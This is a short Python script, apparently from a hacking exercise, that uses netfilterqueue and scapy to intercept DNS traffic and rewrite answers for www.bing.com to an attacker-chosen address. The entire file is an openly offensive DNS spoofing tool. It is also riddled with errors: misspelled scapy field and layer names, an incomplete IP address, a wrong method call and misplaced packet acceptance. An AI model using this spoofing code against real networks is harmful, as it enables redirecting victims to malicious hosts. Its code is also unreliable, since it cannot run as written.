#!/usr/bin/env python
import netfilterqueue
import scapy as scapy
from scapy.layers import IP


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSSR):
        qname = scapy_packet(scapy.DNSQR).qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrame=qname, rdata="192.168.63")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].cksum
            del scapy_packet[scapy.IDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set.payload(str(scapy_packet))

        packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
